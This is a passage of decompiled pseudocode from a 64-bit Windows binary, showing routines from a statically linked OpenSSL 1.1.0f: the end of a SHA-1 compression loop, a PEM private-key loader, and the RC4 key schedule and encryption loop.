    v27 = __ROL4__(v24, 30);
    v315 = _byteswap_ulong(a2[6]);
    v28 = v17 + (v20 ^ v26) + 1518500249 + __ROL4__(v25, 5) + v341;
    v308 = _byteswap_ulong(a2[7]);
    v29 = v20 + (v23 ^ v25 & (v27 ^ v23)) + 1518500249 + __ROL4__(v28, 5) + v315;
    v30 = __ROL4__(v25, 30);
    v31 = v27 ^ v28 & (v30 ^ v27);
    v32 = __ROL4__(v28, 30);
    v296 = _byteswap_ulong(a2[8]);
    v33 = __ROL4__(v29, 5);
    v34 = v30 ^ v29 & (v32 ^ v30);
    v35 = __ROL4__(v29, 30);
    v36 = v308 + v33 + 1518500249 + v31 + v23;
    v37 = (v32 ^ v36 & (v32 ^ v35)) + 1518500249;
    v38 = __ROL4__(v36, 5);
    v300 = _byteswap_ulong(a2[9]);
    v39 = __ROL4__(v36, 30);
    v40 = v27 + v296 + v38 + 1518500249 + v34;
    v322 = _byteswap_ulong(a2[10]);
    v41 = v30 + v37 + __ROL4__(v40, 5) + v300;
    v304 = _byteswap_ulong(a2[11]);
    v42 = v35 ^ v40 & (v39 ^ v35);
    v43 = __ROL4__(v40, 30);
    v44 = __ROL4__(v41, 5);
    v45 = v41 & (v43 ^ v39);
    v46 = __ROL4__(v41, 30);
    v47 = v322 + v44 + v42 + v32 + 1518500249;
    v48 = v43 ^ v47 & (v46 ^ v43);
    v49 = __ROL4__(v47, 5);
    v319 = _byteswap_ulong(a2[12]);
    v50 = __ROL4__(v47, 30);
    v51 = v35 + v304 + v49 + 1518500249 + (v39 ^ v45);
    v333 = _byteswap_ulong(a2[13]);
    v52 = v39 + 1518500249 + v48 + __ROL4__(v51, 5) + v319;
    v53 = v51 & (v50 ^ v46);
    v54 = __ROL4__(v51, 30);
    v354 = _byteswap_ulong(a2[14]);
    v55 = v43 + v333 + __ROL4__(v52, 5) + 1518500249 + (v46 ^ v53);
    v56 = v50 ^ v52 & (v54 ^ v50);
    v57 = __ROL4__(v52, 30);
    v292 = _byteswap_ulong(a2[15]);
    v352 = a2 + 16;
    v58 = v354 + 1518500249 + __ROL4__(v55, 5) + v56 + v46;
    v59 = v54 ^ v55 & (v54 ^ v57);
    v60 = __ROL4__(v55, 30);
    v335 = __ROL4__(v347 ^ v328 ^ v296 ^ v333, 1);
    v61 = v57 ^ v58 & (v60 ^ v57);
    v312 = __ROL4__(v338 ^ v344 ^ v300 ^ v354, 1);
    v62 = v58;
    v63 = __ROL4__(v58, 30);
    v64 = v292 + __ROL4__(v62, 5) + 1518500249 + v59 + v50;
    v331 = __ROL4__(v328 ^ v325 ^ v322 ^ v292, 1);
    v65 = v64 & (v63 ^ v60);
    v66 = v335 + v54 + 1518500249 + __ROL4__(v64, 5) + v61;
    v67 = __ROL4__(v64, 30);
    v68 = v312 + (v60 ^ v65) + 1518500249 + __ROL4__(v66, 5) + v57;
    v69 = v331 + v60 + __ROL4__(v68, 5) + 1518500249 + (v63 ^ v66 & (v67 ^ v63));
    v70 = __ROL4__(v66, 30);
    v71 = (v67 ^ v68 & (v70 ^ v67)) + 1518500249;
    v72 = __ROL4__(v68, 30);
    v73 = __ROL4__(v312 ^ v325 ^ v315 ^ v319, 1);
    v74 = __ROL4__(v335 ^ v344 ^ v341 ^ v304, 1);
    v75 = v71 + __ROL4__(v69, 5) + v63;
    v76 = __ROL4__(v331 ^ v341 ^ v308 ^ v333, 1);
    v77 = __ROL4__(v73 ^ v308 ^ v300 ^ v292, 1);
    v78 = v70 ^ v69;
    v79 = __ROL4__(v69, 30);
    v80 = v74 + v75;
    v81 = __ROL4__(v80, 5);
    v82 = v80 ^ v79;
    v83 = __ROL4__(v80, 30);
    v84 = v73 + (v72 ^ v78) + 1859775393 + v81 + v67;
    v85 = __ROL4__(v84, 5);
    v86 = v84 ^ v83 ^ v79;
    v87 = __ROL4__(v84, 30);
    v88 = v76 + v70 + 1859775393 + v85 + (v72 ^ v82);
    v89 = __ROL4__(v74 ^ v315 ^ v296 ^ v354, 1);
    v90 = v89 + v86 + 1859775393 + __ROL4__(v88, 5) + v72;
    v91 = v88 ^ v87 ^ v83;
    v92 = __ROL4__(v88, 30);
    v93 = v77 + v91 + 1859775393 + __ROL4__(v90, 5) + v79;
    v94 = __ROL4__(v335 ^ v76 ^ v296 ^ v322, 1);
    v95 = (v90 ^ v92 ^ v87) + 1859775393 + __ROL4__(v93, 5) + v83;
    v96 = __ROL4__(v90, 30);
    v97 = __ROL4__(v312 ^ v89 ^ v300 ^ v304, 1);
    v98 = v94 + v95;
    v99 = (v93 ^ v96 ^ v92) + 1859775393;
    v100 = __ROL4__(v93, 30);
    v101 = v97 + v99 + __ROL4__(v98, 5) + v87;
    v102 = v100 ^ v96 ^ v98;
    v297 = __ROL4__(v331 ^ v77 ^ v322 ^ v319, 1);
    v103 = __ROL4__(v98, 30);
    v104 = v297 + 1859775393 + v102 + __ROL4__(v101, 5) + v92;
    v105 = v100 ^ v101 ^ v103;
    v106 = __ROL4__(v101, 30);
    v305 = __ROL4__(v74 ^ v94 ^ v304 ^ v333, 1);
    v107 = v305 + 1859775393 + v105 + __ROL4__(v104, 5) + v96;
    v108 = v104 ^ v106 ^ v103;
    v109 = __ROL4__(v104, 30);
    v301 = __ROL4__(v73 ^ v97 ^ v319 ^ v354, 1);
    v110 = v301 + 1859775393 + v108 + __ROL4__(v107, 5) + v100;
    v320 = __ROL4__(v76 ^ v297 ^ v333 ^ v292, 1);
    v111 = (v107 ^ v109 ^ v106) + __ROL4__(v110, 5) + v103;
    v112 = __ROL4__(v107, 30);
    v113 = v320 + 1859775393 + v111;
    v114 = v110 ^ v112 ^ v109;
    v115 = __ROL4__(v110, 30);
    v355 = __ROL4__(v335 ^ v89 ^ v305 ^ v354, 1);
    v116 = v355 + 1859775393 + v114 + __ROL4__(v113, 5) + v106;
    v117 = v113 ^ v115 ^ v112;
    v118 = __ROL4__(v113, 30);
    v293 = __ROL4__(v312 ^ v77 ^ v301 ^ v292, 1);
    v119 = v293 + 1859775393 + v117 + __ROL4__(v116, 5) + v109;
    v120 = v115 ^ v116;
    v121 = __ROL4__(v116, 30);
    v309 = __ROL4__(v335 ^ v331 ^ v94 ^ v320, 1);
    v122 = v309 + 1859775393 + (v118 ^ v120) + __ROL4__(v119, 5) + v112;
    v123 = v119 ^ v121;
    v124 = __ROL4__(v119, 30);
    v313 = __ROL4__(v312 ^ v74 ^ v97 ^ v355, 1);
    v125 = v313 + 1859775393 + (v118 ^ v123) + __ROL4__(v122, 5) + v115;
    v126 = v122 ^ v124 ^ v121;
    v316 = __ROL4__(v331 ^ v73 ^ v297 ^ v293, 1);
    v127 = __ROL4__(v122, 30);
    v128 = v316 + 1859775393 + v126 + __ROL4__(v125, 5) + v118;
    v129 = v125 ^ v127 ^ v124;
    v130 = __ROL4__(v125, 30);
    v131 = v74 ^ v76 ^ v305;
    v132 = v301;
    v323 = __ROL4__(v309 ^ v131, 1);
    v133 = v323 + 1859775393 + v129 + __ROL4__(v128, 5) + v121;
    v134 = v128 ^ v130 ^ v127;
    v135 = __ROL4__(v128, 30);
    v326 = __ROL4__(v313 ^ v73 ^ v89 ^ v301, 1);
    v136 = v326 + v134 + 1859775393 + __ROL4__(v133, 5) + v124;
    v329 = __ROL4__(v316 ^ v76 ^ v77 ^ v320, 1);
    v137 = (v133 ^ v135 ^ v130) + 1859775393;
    v138 = __ROL4__(v133, 30);
    v139 = v329 + v137 + __ROL4__(v136, 5) + v127;
    v334 = __ROL4__(v323 ^ v89 ^ v94 ^ v355, 1);
    v140 = v334 + 1859775393 + (v138 ^ v135 ^ v136) + __ROL4__(v139, 5) + v130;
    v141 = v309;
    v142 = __ROL4__(v136, 30);
    v143 = v135 + 1859775393 + __ROL4__(v140, 5) + (v138 ^ v139 ^ v142);
    v144 = __ROL4__(v139, 30);
    v145 = v140 & v144;
    v302 = __ROL4__(v326 ^ v77 ^ v97 ^ v293, 1);
    v146 = v143 + v302;
    v310 = __ROL4__(v309 ^ v329 ^ v94 ^ v297, 1);
    v147 = v142 & (v140 | v144);
    v148 = __ROL4__(v140, 30);
    v149 = v310 + v138 + (v145 | v147);
    v150 = v313;
    v151 = v313 ^ v334 ^ v97 ^ v305;
    v152 = v316;
    v332 = __ROL4__(v151, 1);
    v153 = v149 + __ROL4__(v146, 5) - 1894007588;
    v154 = v144 & (v146 | v148);
    v155 = v146 & v148;
    v156 = __ROL4__(v146, 30);
    v157 = v332 + v142 + (v155 | v154) + __ROL4__(v153, 5) - 1894007588;
    v314 = __ROL4__(v316 ^ v302 ^ v297 ^ v132, 1);
    v158 = v153 & v156 | v148 & (v153 | v156);
    v159 = __ROL4__(v153, 30);
    v160 = v314 + v144 + v158 + __ROL4__(v157, 5) - 1894007588;
    v306 = __ROL4__(v323 ^ v310 ^ v305 ^ v320, 1);
    v161 = v157 & v159 | v156 & (v157 | v159);
    v162 = __ROL4__(v157, 30);
    v298 = __ROL4__(v326 ^ v332 ^ v132 ^ v355, 1);
    v163 = v162 & v160;
    v356 = __ROL4__(v141 ^ v334 ^ v306 ^ v355, 1);
    v164 = v306 + v148 + v161 + __ROL4__(v160, 5) - 1894007588;
    v317 = __ROL4__(v329 ^ v314 ^ v320 ^ v293, 1);
    v165 = v162 | v160;
    v166 = __ROL4__(v160, 30);
    v167 = v298 + v156 + (v163 | v159 & v165) + __ROL4__(v164, 5) - 1894007588;
    v168 = v164 & v166 | v162 & (v164 | v166);
    v169 = __ROL4__(v164, 30);
    v170 = v317 + v159 + v168 + __ROL4__(v167, 5) - 1894007588;
    v171 = v167 & v169 | v166 & (v167 | v169);
    v172 = __ROL4__(v167, 30);
    v173 = v356 + v162 + v171 + __ROL4__(v170, 5) - 1894007588;
    v294 = __ROL4__(v150 ^ v302 ^ v298 ^ v293, 1);
    v174 = v294 + v166 + (v170 & v172 | v169 & (v170 | v172));
    v175 = __ROL4__(v170, 30);
    v176 = v174 + __ROL4__(v173, 5) - 1894007588;
    v336 = __ROL4__(v141 ^ v152 ^ v310 ^ v317, 1);
    v177 = v152 ^ v326 ^ v314 ^ v294;
    v178 = v329;
    v179 = v173 & v175 | v172 & (v173 | v175);
    v180 = __ROL4__(v173, 30);
    v339 = __ROL4__(v177, 1);
    v342 = __ROL4__(v150 ^ v323 ^ v332 ^ v356, 1);
    v330 = __ROL4__(v336 ^ v323 ^ v329 ^ v306, 1);
    v181 = v336 + v169 + v179 + __ROL4__(v176, 5) - 1894007588;
    v182 = v176 & v180 | v175 & (v176 | v180);
    v183 = __ROL4__(v176, 30);
    v184 = v183 & v181;
    v185 = v342 + v172 + v182 + __ROL4__(v181, 5) - 1894007588;
    v186 = v183 | v181;
    v187 = __ROL4__(v181, 30);
    v188 = v339 + v175 + (v184 | v180 & v186) + __ROL4__(v185, 5) - 1894007588;
    v189 = v330 + v180 + (v185 & v187 | v183 & (v185 | v187)) + __ROL4__(v188, 5) - 1894007588;
    v190 = v178 ^ v302 ^ v317;
    v191 = v310;
    v192 = __ROL4__(v185, 30);
    v348 = __ROL4__(v342 ^ v326 ^ v334 ^ v298, 1);
    v193 = v188 & v192 | v187 & (v188 | v192);
    v194 = __ROL4__(v188, 30);
    v345 = __ROL4__(v339 ^ v190, 1);
    v327 = __ROL4__(v330 ^ v334 ^ v310 ^ v356, 1);
    v195 = v348 + v183 + v193 + __ROL4__(v189, 5) - 1894007588;
    v196 = v189 & v194;
    v197 = v192 & (v189 | v194);
    v198 = __ROL4__(v189, 30);
    v311 = __ROL4__(v348 ^ v302 ^ v332 ^ v294, 1);
    v199 = __ROL4__(v195, 5) + v345 + (v196 | v197) - 1894007588 + v187;
    v200 = v194 & (v195 | v198);
    v201 = v195 & v198;
    v202 = __ROL4__(v195, 30);
    v203 = v327 + v192 - 1894007588 + (v201 | v200) + __ROL4__(v199, 5);
    v204 = v311 + v194 - 1894007588 + (v199 & v202 | v198 & (v199 | v202)) + __ROL4__(v203, 5);
    v205 = __ROL4__(v199, 30);
    v206 = __ROL4__(v336 ^ v345 ^ v191 ^ v314, 1);
    v207 = v206 + v198 + (v205 & v203 | v202 & (v205 | v203));
    v208 = __ROL4__(v203, 30);
    v303 = v206;
    v209 = v204 & v208;
    v210 = v207 + __ROL4__(v204, 5) - 1894007588;
    v324 = __ROL4__(v342 ^ v327 ^ v332 ^ v306, 1);
    v321 = __ROL4__(v339 ^ v311 ^ v314 ^ v298, 1);
    v307 = __ROL4__(v330 ^ v206 ^ v306 ^ v317, 1);
    v211 = v205 & (v204 | v208);
    v212 = __ROL4__(v204, 30);
    v213 = v324 + v202 + (v209 | v211);
    v214 = v210 & v212;
    v215 = v213 + __ROL4__(v210, 5) - 1894007588;
    v216 = v208 & (v210 | v212);
    v217 = __ROL4__(v210, 30);
    v218 = v321 + v205 + (v214 | v216) + __ROL4__(v215, 5) - 1894007588;
    v219 = v215 & v217 | v212 & (v215 | v217);
    v220 = __ROL4__(v215, 30);
    v221 = v307 + v208 - 1894007588 + v219 + __ROL4__(v218, 5);
    v299 = __ROL4__(v348 ^ v324 ^ v298 ^ v356, 1);
    v222 = (v218 ^ v220 ^ v217) - 899497514;
    v223 = __ROL4__(v218, 30);
    v224 = v299 + v222 + v212 + __ROL4__(v221, 5);
    v225 = (v221 ^ v223 ^ v220) - 899497514;
    v226 = __ROL4__(v221, 30);
    v227 = __ROL4__(v345 ^ v321 ^ v317 ^ v294, 1);
    v228 = v227 + v225 + __ROL4__(v224, 5) + v217;
    v295 = __ROL4__(v342 ^ v311 ^ v299 ^ v294, 1);
    v229 = v223 ^ v224;
    v230 = __ROL4__(v224, 30);
    v318 = v227;
    v357 = __ROL4__(v336 ^ v327 ^ v307 ^ v356, 1);
    v231 = v357 + (v226 ^ v229) - 899497514 + __ROL4__(v228, 5) + v220;
    v232 = v295 - 899497514 + (v226 ^ v228 ^ v230);
    v233 = __ROL4__(v228, 30);
    v234 = v232 + __ROL4__(v231, 5) + v223;
    v337 = __ROL4__(v336 ^ v339 ^ v303 ^ v227, 1);
    v235 = (v231 ^ v233 ^ v230) - 899497514;
    v236 = __ROL4__(v231, 30);
    v237 = v337 + v235 + __ROL4__(v234, 5) + v226;
    v238 = v230 + (v234 ^ v236 ^ v233) - 899497514;
    v239 = v339 ^ v348 ^ v321 ^ v295;
    v240 = __ROL4__(v234, 30);
    v340 = __ROL4__(v342 ^ v330 ^ v324 ^ v357, 1);
    v241 = v345;
    v242 = __ROL4__(v239, 1);
    v243 = v238 + v340 + __ROL4__(v237, 5);
    v349 = __ROL4__(v340 ^ v348 ^ v327 ^ v299, 1);
    v244 = (v237 ^ v240 ^ v236) - 899497514;
    v245 = __ROL4__(v237, 30);
    v346 = __ROL4__(v337 ^ v330 ^ v345 ^ v307, 1);
    v246 = v241 ^ v311 ^ v227;
    v247 = v242 + v244 + __ROL4__(v243, 5) + v233;
    v248 = __ROL4__(v346 ^ v327 ^ v303 ^ v357, 1);
    v249 = (v243 ^ v245 ^ v240) - 899497514;
    v250 = __ROL4__(v243, 30);
    v251 = v346 + v249 + __ROL4__(v247, 5) + v236;
    v343 = __ROL4__(v242 ^ v246, 1);
    v252 = v250 ^ v245 ^ v247;
    v253 = __ROL4__(v247, 30);
    v254 = v349 + v252 - 899497514 + __ROL4__(v251, 5) + v240;
    v255 = (v250 ^ v251 ^ v253) - 899497514;
    v256 = __ROL4__(v251, 30);
    v257 = v343 + v255 + __ROL4__(v254, 5) + v245;
    v258 = v248 + (v254 ^ v256 ^ v253) - 899497514;
    v259 = __ROL4__(v254, 30);
    v260 = v258 + v250 + __ROL4__(v257, 5);
    v261 = __ROL4__(v349 ^ v311 ^ v324 ^ v295, 1);
    v262 = __ROL4__(v337 ^ v343 ^ v303 ^ v321, 1);
    v263 = (v257 ^ v259 ^ v256) - 899497514;
    v264 = __ROL4__(v257, 30);
    v265 = v261 + v263 + v253 + __ROL4__(v260, 5);
    v266 = (v260 ^ v264 ^ v259) - 899497514;
    v267 = __ROL4__(v260, 30);
    v268 = v262 + v266 + v256 + __ROL4__(v265, 5);
    v269 = (v265 ^ v267 ^ v264) - 899497514;
    v270 = __ROL4__(v265, 30);
    v271 = __ROL4__(v340 ^ v248 ^ v324 ^ v307, 1);
    v272 = v271 + v269 + v259 + __ROL4__(v268, 5);
    v273 = v267 ^ v268;
    v274 = __ROL4__(v268, 30);
    v275 = __ROL4__(v242 ^ v261 ^ v321 ^ v299, 1);
    v276 = v275 + (v270 ^ v273) - 899497514 + v264 + __ROL4__(v272, 5);
    v277 = __ROL4__(v346 ^ v262 ^ v307 ^ v318, 1);
    v278 = v277 + (v270 ^ v272 ^ v274) - 899497514 + __ROL4__(v276, 5) + v267;
    v279 = __ROL4__(v272, 30);
    v280 = __ROL4__(v349 ^ v271 ^ v299 ^ v357, 1);
    v281 = (v276 ^ v279 ^ v274) - 899497514;
    v282 = __ROL4__(v276, 30);
    v283 = v280 + v281 + v270 + __ROL4__(v278, 5);
    v284 = (v278 ^ v282 ^ v279) - 899497514;
    v285 = __ROL4__(v278, 30);
    v286 = v284 + v274 + __ROL4__(v343 ^ v275 ^ v318 ^ v295, 1) + __ROL4__(v283, 5);
    v287 = v283 ^ v285 ^ v282;
    v288 = __ROL4__(v283, 30);
    v289 = v287 - 899497514 + v279 + __ROL4__(v337 ^ v248 ^ v277 ^ v357, 1) + __ROL4__(v286, 5);
    v290 = (v286 ^ v288 ^ v285) - 899497514 + __ROL4__(v289, 5) + v282 + __ROL4__(v340 ^ v261 ^ v280 ^ v295, 1);
    v7 = result + __ROL4__(v286, 30);
    HIDWORD(i) += v285;
    v6 = HIDWORD(i);
    *a1 += v290;
    a1[1] += v289;
    v291 = a3-- == 1;
    v8 = *a1;
    v9 = a1[1];
    a1[2] = v7;
    LODWORD(i) = v288 + i;
    *(_QWORD *)(a1 + 3) = i;
    if ( v291 )
      break;
    a2 = v352;
    result = v7;
  }
  return result;
}

//----- (000000014005DAB0) ----------------------------------------------------
__int64 __fastcall sub_14005DAB0(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 120) = a2;
  return 1i64;
}

//----- (000000014005DAC0) ----------------------------------------------------
__int64 __fastcall sub_14005DAC0(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 136) = a2;
  return 1i64;
}

//----- (000000014005DAD0) ----------------------------------------------------
_DWORD *__fastcall sub_14005DAD0(
        __int64 a1,
        __int64 *a2,
        __int64 (__fastcall *a3)(char *, __int64, _QWORD, _BYTE *),
        _BYTE *a4)
{
  _DWORD *v4; // rbx
  char *v9; // rsi
  __int64 v10; // rax
  unsigned int *v11; // rsi
  unsigned int *v12; // rsi
  int v13; // eax
  unsigned int *v14; // rbp
  int v15; // eax
  __int64 v16; // rax
  unsigned int v17; // [rsp+40h] [rbp-458h] BYREF
  char *v18; // [rsp+48h] [rbp-450h] BYREF
  char *Str1; // [rsp+50h] [rbp-448h] BYREF
  char *v20; // [rsp+58h] [rbp-440h] BYREF
  char v21[1024]; // [rsp+60h] [rbp-438h] BYREF

  v4 = 0i64;
  Str1 = 0i64;
  v18 = 0i64;
  v20 = 0i64;
  if ( !(unsigned int)sub_1400A2C30(&v20, (int *)&v17, &Str1, "ANY PRIVATE KEY", a1, a3, a4) )
    return 0i64;
  v9 = Str1;
  v18 = v20;
  if ( !strcmp(Str1, "PRIVATE KEY") )
  {
    v10 = sub_140067700(0i64, &v18, v17);
    v11 = (unsigned int *)v10;
    if ( v10 )
    {
      v4 = sub_1400A2640(v10);
      if ( a2 )
      {
        sub_14001D3C0(*a2);
        *a2 = (__int64)v4;
      }
      sub_1400675C0(v11);
      goto LABEL_23;
    }
LABEL_24:
    sub_140024610(9, 123, 13, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_pkey.c", 86);
    goto LABEL_25;
  }
  if ( !strcmp(v9, "ENCRYPTED PRIVATE KEY") )
  {
    v12 = (unsigned int *)sub_1400A2600(0i64, &v18, v17);
    if ( !v12 )
      goto LABEL_24;
    if ( a3 )
      v13 = a3(v21, 1024i64, 0i64, a4);
    else
      v13 = sub_1400A2E30(v21, 1024, 0, a4);
    if ( v13 <= 0 )
    {
      sub_140024610(9, 123, 104, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_pkey.c", 63);
      sub_1400A25D0(v12);
      goto LABEL_25;
    }
    v14 = (unsigned int *)sub_1400A27A0((__int64 *)v12, v21, v13);
    sub_1400A25D0(v12);
    if ( !v14 )
      goto LABEL_24;
    v4 = sub_1400A2640((__int64)v14);
    if ( a2 )
    {
      sub_14001D3C0(*a2);
      *a2 = (__int64)v4;
    }
    sub_1400675C0(v14);
  }
  else
  {
    v15 = sub_1400A4410(v9, "PRIVATE KEY");
    if ( v15 <= 0 )
      goto LABEL_24;
    v16 = sub_14002CD10(0i64, Str1, v15);
    if ( !v16 || !*(_QWORD *)(v16 + 184) )
      goto LABEL_24;
    v4 = sub_1400A2460(*(_DWORD *)v16, (_DWORD **)a2, &v18, v17);
  }
LABEL_23:
  if ( !v4 )
    goto LABEL_24;
LABEL_25:
  sub_14001D930(Str1);
  sub_14001DA40(v20, (int)v17, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pem\\pem_pkey.c", 0x59u);
  return v4;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014005DD50) ----------------------------------------------------
__int64 __fastcall sub_14005DD50(_QWORD *a1, int a2, __int64 a3)
{
  __m128i si128; // xmm2
  _QWORD *v4; // r11
  int v6; // r8d
  __int64 v7; // r10
  unsigned int v8; // eax
  __m128i *v10; // r9
  __m128i v11; // xmm1
  __m128i v12; // xmm0
  _QWORD *v13; // rbx
  __int64 v14; // rbp
  int v15; // edx
  unsigned __int8 v16; // cl
  int v17; // r10d
  unsigned __int8 v18; // r9
  _DWORD *v19; // rcx
  int v20; // r8d
  unsigned __int8 v21; // cl
  int v22; // r9d
  int v23; // r8d
  int v24; // eax
  char v25; // cl
  int v26; // r9d
  unsigned __int8 v27; // cl
  int v28; // r8d
  __int64 result; // rax

  si128 = _mm_load_si128((const __m128i *)&xmmword_1400FB200);
  v4 = a1 + 1;
  *a1 = 0i64;
  v6 = 0;
  LOBYTE(v7) = 0;
  v8 = 0;
  v10 = (__m128i *)(a1 + 1);
  do
  {
    v11 = _mm_cvtsi32_si128(v8 + 4);
    v10 += 2;
    v12 = _mm_shuffle_epi32(_mm_cvtsi32_si128(v8), 0);
    v8 += 8;
    v10[-2] = _mm_add_epi32(v12, si128);
    v10[-1] = _mm_add_epi32(_mm_shuffle_epi32(v11, 0), si128);
  }
  while ( v8 < 0x100 );
  v13 = a1 + 2;
  v14 = 64i64;
  do
  {
    v15 = *((_DWORD *)v13 - 2);
    v13 += 2;
    v16 = v7 + v15 + *(_BYTE *)(v6 + a3);
    v17 = 0;
    v18 = v16;
    v19 = (_DWORD *)v4 + v16;
    if ( v6 + 1 != a2 )
      v17 = v6 + 1;
    *((_DWORD *)v13 - 6) = *v19;
    *v19 = v15;
    v20 = *((_DWORD *)v13 - 5);
    v21 = v18 + v20 + *(_BYTE *)(v17 + a3);
    v22 = 0;
    if ( v17 + 1 != a2 )
      v22 = v17 + 1;
    *((_DWORD *)v13 - 5) = *((_DWORD *)v4 + v21);
    *((_DWORD *)v4 + v21) = v20;
    v23 = *((_DWORD *)v13 - 4);
    v24 = v22 + 1;
    v25 = v21 + *(_BYTE *)(v22 + a3);
    v26 = 0;
    v27 = v23 + v25;
    if ( v24 != a2 )
      v26 = v24;
    *((_DWORD *)v13 - 4) = *((_DWORD *)v4 + v27);
    *((_DWORD *)v4 + v27) = v23;
    v28 = *((_DWORD *)v13 - 3);
    v7 = (unsigned __int8)(v28 + v27 + *(_BYTE *)(v26 + a3));
    result = *((unsigned int *)v4 + v7);
    *((_DWORD *)v13 - 3) = result;
    *((_DWORD *)v4 + v7) = v28;
    v6 = 0;
    if ( v26 + 1 != a2 )
      v6 = v26 + 1;
    --v14;
  }
  while ( v14 );
  return result;
}
// 1400FB200: using guessed type __int128 xmmword_1400FB200;

//----- (000000014005DEB0) ----------------------------------------------------
char __fastcall sub_14005DEB0(_DWORD *a1, unsigned __int64 a2, _BYTE *a3, _BYTE *a4)
{
  __int64 v4; // r11
  __int64 v5; // r10
  unsigned __int64 i; // rbp
  __int64 v10; // r9
  int v11; // r8d
  __int64 v12; // r10
  int v13; // ecx
  __int64 v14; // r9
  int v15; // r8d
  __int64 v16; // r10
  int v17; // ecx
  __int64 v18; // r9
  int v19; // r8d
  __int64 v20; // r10
  int v21; // ecx
  __int64 v22; // r9
  int v23; // r8d
  __int64 v24; // r10
  int v25; // ecx
  __int64 v26; // r9
  int v27; // r8d
  __int64 v28; // r10
  int v29; // ecx
  __int64 v30; // r9
  int v31; // r8d
  __int64 v32; // r10
  int v33; // ecx
  __int64 v34; // r9
  int v35; // r8d
  __int64 v36; // r10
  int v37; // ecx
  int v38; // r8d
  int v39; // ecx
  char result; // al
  int v41; // r8d
  int v42; // ecx
  __int64 v43; // rbx
  int v44; // r8d
  int v45; // ecx
  __int64 v46; // rbx
  int v47; // r8d
  int v48; // ecx
  __int64 v49; // rbx
  int v50; // r8d
  int v51; // ecx
  __int64 v52; // rbx
  int v53; // r8d
  int v54; // ecx
  __int64 v55; // rbx
  int v56; // r8d
  int v57; // ecx
  __int64 v58; // rbx
  int v59; // r8d
  int v60; // ecx
  __int64 v61; // rbx
  int v62; // r8d
  int v63; // ecx

  LODWORD(v4) = *a1;
  LODWORD(v5) = a1[1];
  for ( i = a2 >> 3; i; --i )
  {
    v10 = (unsigned __int8)(v4 + 1);
    v11 = a1[v10 + 2];
    v12 = (unsigned __int8)(v11 + v5);
    v13 = a1[v12 + 2];
    a1[v10 + 2] = v13;
    a1[v12 + 2] = v11;
    *a4 = *a3 ^ LOBYTE(a1[(unsigned __int8)(v13 + v11) + 2]);
    v14 = (unsigned __int8)(v4 + 2);
    v15 = a1[v14 + 2];
    v16 = (unsigned __int8)(v15 + v12);
    v17 = a1[v16 + 2];
    a1[v14 + 2] = v17;
    a1[v16 + 2] = v15;
    a4[1] = a3[1] ^ LOBYTE(a1[(unsigned __int8)(v17 + v15) + 2]);
    v18 = (unsigned __int8)(v4 + 3);
    v19 = a1[v18 + 2];
    v20 = (unsigned __int8)(v19 + v16);
    v21 = a1[v20 + 2];
    a1[v18 + 2] = v21;
    a1[v20 + 2] = v19;
    a4[2] = a3[2] ^ LOBYTE(a1[(unsigned __int8)(v21 + v19) + 2]);
    v22 = (unsigned __int8)(v4 + 4);
    v23 = a1[v22 + 2];
    v24 = (unsigned __int8)(v23 + v20);
    v25 = a1[v24 + 2];
    a1[v22 + 2] = v25;
    a1[v24 + 2] = v23;
    a4[3] = a3[3] ^ LOBYTE(a1[(unsigned __int8)(v25 + v23) + 2]);
    v26 = (unsigned __int8)(v4 + 5);
    v27 = a1[v26 + 2];
    v28 = (unsigned __int8)(v27 + v24);
    v29 = a1[v28 + 2];
    a1[v26 + 2] = v29;
    a1[v28 + 2] = v27;
    a4[4] = a3[4] ^ LOBYTE(a1[(unsigned __int8)(v29 + v27) + 2]);
    v30 = (unsigned __int8)(v4 + 6);
    v31 = a1[v30 + 2];
    v32 = (unsigned __int8)(v31 + v28);
    v33 = a1[v32 + 2];
    a1[v30 + 2] = v33;
    a1[v32 + 2] = v31;
    a4[5] = a3[5] ^ LOBYTE(a1[(unsigned __int8)(v33 + v31) + 2]);
    v34 = (unsigned __int8)(v4 + 7);
    v35 = a1[v34 + 2];
    v36 = (unsigned __int8)(v35 + v32);
    v37 = a1[v36 + 2];
    a1[v34 + 2] = v37;
    a1[v36 + 2] = v35;
    a4[6] = a3[6] ^ LOBYTE(a1[(unsigned __int8)(v37 + v35) + 2]);
    v4 = (unsigned __int8)(v4 + 8);
    v38 = a1[v4 + 2];
    v5 = (unsigned __int8)(v38 + v36);
    v39 = a1[v5 + 2];
    a1[v4 + 2] = v39;
    a1[v5 + 2] = v38;
    result = a3[7] ^ LOBYTE(a1[(unsigned __int8)(v39 + v38) + 2]);
    a3 += 8;
    a4[7] = result;
    a4 += 8;
  }
  if ( (a2 & 7) != 0 )
  {
    v4 = (unsigned __int8)(v4 + 1);
    v41 = a1[v4 + 2];
    v5 = (unsigned __int8)(v41 + v5);
    v42 = a1[v5 + 2];
    a1[v4 + 2] = v42;
    a1[v5 + 2] = v41;
    result = *a3 ^ LOBYTE(a1[(unsigned __int8)(v42 + v41) + 2]);
    *a4 = result;
    v43 = (a2 & 7) - 1;
    if ( (a2 & 7) != 1 )
    {
      do
      {
        v4 = (unsigned __int8)(v4 + 1);
        v44 = a1[v4 + 2];
        v5 = (unsigned __int8)(v44 + v5);
        v45 = a1[v5 + 2];
        a1[v4 + 2] = v45;
        a1[v5 + 2] = v44;
        result = a3[1] ^ LOBYTE(a1[(unsigned __int8)(v45 + v44) + 2]);
        a4[1] = result;
        v46 = v43 - 1;
        if ( !v46 )
          break;
        v4 = (unsigned __int8)(v4 + 1);
        v47 = a1[v4 + 2];
        v5 = (unsigned __int8)(v47 + v5);
        v48 = a1[v5 + 2];
        a1[v4 + 2] = v48;
        a1[v5 + 2] = v47;
        result = a3[2] ^ LOBYTE(a1[(unsigned __int8)(v48 + v47) + 2]);
        a4[2] = result;
        v49 = v46 - 1;
        if ( !v49 )
          break;
        v4 = (unsigned __int8)(v4 + 1);
        v50 = a1[v4 + 2];
        v5 = (unsigned __int8)(v50 + v5);
        v51 = a1[v5 + 2];
        a1[v4 + 2] = v51;
        a1[v5 + 2] = v50;
        result = a3[3] ^ LOBYTE(a1[(unsigned __int8)(v51 + v50) + 2]);
        a4[3] = result;
        v52 = v49 - 1;
